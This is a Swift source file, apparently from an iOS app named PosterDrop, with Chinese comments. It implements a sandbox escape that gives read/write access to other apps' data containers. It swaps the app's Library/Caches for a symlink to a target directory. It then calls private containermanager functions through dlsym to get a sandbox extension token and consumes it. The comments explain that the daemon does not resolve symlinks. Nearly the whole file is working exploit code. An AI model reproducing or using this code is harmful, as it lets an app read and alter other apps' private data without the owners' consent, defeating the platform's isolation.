//
//  SandboxEscape.swift
//  PosterDrop
//
//  直连通道的底层：向 containermanagerd 申请一个“看起来属于自己”的沙箱扩展，
//  实际指向任意容器目录，从而在 App 内直接读写别的 App 容器。
//
//  原理（复现 worse_query / bad_query 所描述的行为，非拷贝其代码）：
//    1. 把自己（或自己 App Group）的 Library/Caches 换成一个指向目标的符号链接；
//    2. container_query 以 class=app/appGroup、part=3（Library/Caches）查询该容器；
//    3. 守护进程按 part 拼路径并签发 sandbox extension —— 它没有对符号链接做 realpath 校验，
//       于是扩展实际覆盖的是链接指向的目录；
//    4. sandbox_extension_consume 后，本进程就拿到了该目录（含子树）的读写权。
//
//  注意：这是“目录级”能力，不是提权，不涉及内核；系统一旦修补签发逻辑即失效。
//

import Foundation
import Darwin

/// 一次已持有的沙箱扩展。deinit 时自动释放。
final class EscapeSession: @unchecked Sendable {

    let target: String
    let label: String
    let handle: Int64

    init(target: String, label: String, handle: Int64) {
        self.target = target
        self.label = label
        self.handle = handle
    }

    deinit {
        SandboxEscape.release(handle)
    }
}

enum SandboxEscape {

    enum Mode: Sendable {
        /// 用自己 App 的数据容器做跳板，不需要任何特殊 entitlement。
        case ownContainer
        /// 用 App Group 容器做跳板，需要 profile 里带 App Groups 能力。
        case appGroup(String)

        var label: String {
            switch self {
            case .ownContainer:
                return "自身容器"
            case .appGroup(let group):
                return "App Group（\(group)）"
            }
        }
    }

    struct Failure: LocalizedError {
        let code: Int64
        let message: String
        var errorDescription: String? { "\(message)（代码 \(code)）" }
    }

    // containermanager 私有符号
    private typealias QueryCreate = @convention(c) () -> UnsafeMutableRawPointer?
    private typealias QuerySetClass = @convention(c) (UnsafeMutableRawPointer?, UInt64) -> Void
    private typealias QuerySetIdentifiers = @convention(c) (UnsafeMutableRawPointer?, UnsafeMutableRawPointer?) -> Void
    private typealias QuerySetFlags = @convention(c) (UnsafeMutableRawPointer?, UInt64) -> Void
    private typealias QuerySetPart = @convention(c) (UnsafeMutableRawPointer?, UInt64) -> Void
    private typealias QueryGetSingleResult = @convention(c) (UnsafeMutableRawPointer?) -> UnsafeMutableRawPointer?
    private typealias QueryFree = @convention(c) (UnsafeMutableRawPointer?) -> Void
    private typealias CopySandboxToken = @convention(c) (UnsafeMutableRawPointer?) -> UnsafeMutablePointer<CChar>?
    private typealias XPCStringCreate = @convention(c) (UnsafePointer<CChar>?) -> UnsafeMutableRawPointer?
    private typealias SandboxConsume = @convention(c) (UnsafePointer<CChar>?) -> Int64
    private typealias SandboxRelease = @convention(c) (Int64) -> Void

    private static let containerClassApp: UInt64 = 2
    private static let containerClassAppGroup: UInt64 = 7
    private static let partCaches: UInt64 = 3

    /// iOS 26 与 27 对 App Group 查询要求的操作标志不同，两个都试一遍。
    private static let flagCandidates: [UInt64] = [
        0x0000_0080_0000_0000,
        0x0000_0008_0000_0000
    ]

    // MARK: - 申请

    static func acquire(target: String, mode: Mode) throws -> EscapeSession {
        let fileManager = FileManager.default

        var isDirectory: ObjCBool = false
        guard fileManager.fileExists(atPath: target, isDirectory: &isDirectory), isDirectory.boolValue else {
            throw Failure(code: -255, message: "目标目录不存在：\(target)")
        }

        let base: String
        let identifier: String
        let classValue: UInt64

        switch mode {
        case .ownContainer:
            base = NSHomeDirectory()
            guard let bundleID = Bundle.main.bundleIdentifier, !bundleID.isEmpty else {
                throw Failure(code: -1, message: "拿不到自身 bundle id")
            }
            identifier = bundleID
            classValue = containerClassApp

        case .appGroup(let group):
            guard !group.isEmpty,
                  let url = fileManager.containerURL(forSecurityApplicationGroupIdentifier: group) else {
                throw Failure(code: -1, message: "App Group 容器不存在，签名里缺少 \(group) 的 entitlement")
            }
            base = url.path
            identifier = group
            classValue = containerClassAppGroup
        }

        // 符号链接必须放在自己的 Caches 上，且目录本身要先消失
        let caches = base + "/Library/Caches"
        try? fileManager.removeItem(atPath: caches)
        do {
            try fileManager.createSymbolicLink(atPath: caches, withDestinationPath: target)
        } catch {
            throw Failure(code: -4, message: "无法在 \(caches) 创建符号链接：\(error.localizedDescription)")
        }
        defer {
            try? fileManager.removeItem(atPath: caches)
            try? fileManager.createDirectory(atPath: caches, withIntermediateDirectories: false)
        }

        // 守护进程接口
        guard let manager = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW) else {
            throw Failure(code: -2, message: "无法加载 libsystem_containermanager")
        }
        defer { dlclose(manager) }

        guard let xpcLib = dlopen("/usr/lib/system/libxpc.dylib", RTLD_NOW) else {
            throw Failure(code: -2, message: "无法加载 libxpc")
        }
        defer { dlclose(xpcLib) }

        func symbol<T>(_ name: String, in handle: UnsafeMutableRawPointer, as type: T.Type) -> T? {
            guard let pointer = dlsym(handle, name) else { return nil }
            return unsafeBitCast(pointer, to: type)
        }

        func globalSymbol<T>(_ name: String, as type: T.Type) -> T? {
            guard let pointer = dlsym(UnsafeMutableRawPointer(bitPattern: -2), name) else { return nil }
            return unsafeBitCast(pointer, to: type)
        }

        guard let create = symbol("container_query_create", in: manager, as: QueryCreate.self),
              let setClass = symbol("container_query_set_class", in: manager, as: QuerySetClass.self),
              let setFlags = symbol("container_query_operation_set_flags", in: manager, as: QuerySetFlags.self),
              let setPart = symbol("container_query_operation_set_part", in: manager, as: QuerySetPart.self),
              let getSingle = symbol("container_query_get_single_result", in: manager, as: QueryGetSingleResult.self),
              let queryFree = symbol("container_query_free", in: manager, as: QueryFree.self),
              let copyToken = symbol("container_copy_sandbox_token", in: manager, as: CopySandboxToken.self),
              let xpcString = symbol("xpc_string_create", in: xpcLib, as: XPCStringCreate.self)
        else {
            throw Failure(code: -2, message: "系统版本不支持：缺少容器查询符号")
        }

        guard let consume = globalSymbol("sandbox_extension_consume", as: SandboxConsume.self) else {
            throw Failure(code: -2, message: "系统版本不支持：缺少 sandbox_extension_consume")
        }

        let setIdentifiers: QuerySetIdentifiers?
        if classValue == containerClassAppGroup {
            setIdentifiers = symbol("container_query_set_group_identifiers", in: manager, as: QuerySetIdentifiers.self)
        } else {
            setIdentifiers = symbol("container_query_set_identifiers", in: manager, as: QuerySetIdentifiers.self)
        }
        guard let applyIdentifiers = setIdentifiers else {
            throw Failure(code: -2, message: "系统版本不支持：缺少标识设置符号")
        }

        // xpc 对象由 xpc 自己管理引用计数，不能 free；随进程存活即可
        let identifierObject = xpcString(identifier)

        var lastCode: Int64 = -5
        for flags in flagCandidates {
            guard let query = create() else {
                lastCode = -3
                continue
            }

            setClass(query, classValue)
            applyIdentifiers(query, identifierObject)
            setPart(query, partCaches)
            setFlags(query, flags)

            defer { queryFree(query) }

            guard let result = getSingle(query) else {
                lastCode = -5
                continue
            }

            guard let tokenPointer = copyToken(result) else {
                lastCode = -6
                continue
            }

            let handle = consume(tokenPointer)
            free(tokenPointer)

            if handle >= 0 {
                return EscapeSession(target: target, label: mode.label, handle: handle)
            }
            lastCode = handle
        }

        throw Failure(code: lastCode, message: describe(lastCode))
    }

    static func release(_ handle: Int64) {
        guard handle >= 0 else { return }
        guard let pointer = dlsym(UnsafeMutableRawPointer(bitPattern: -2), "sandbox_extension_release") else { return }
        typealias Release = @convention(c) (Int64) -> Void
        let releaseHandle = unsafeBitCast(pointer, to: Release.self)
        _ = releaseHandle(handle)
    }

    private static func describe(_ code: Int64) -> String {
        switch code {
        case -1: return "容器不存在（App Group 需要 profile 带 App Groups 能力）"
        case -2: return "系统缺少所需符号，可能已修补"
        case -3: return "创建查询失败"
        case -4: return "无法创建符号链接"
        case -5: return "containermanagerd 拒绝了这次查询"
        case -6: return "内核拒绝签发沙箱扩展"
        case -255: return "目标目录不存在"
        default: return "未知错误"
        }
    }
}
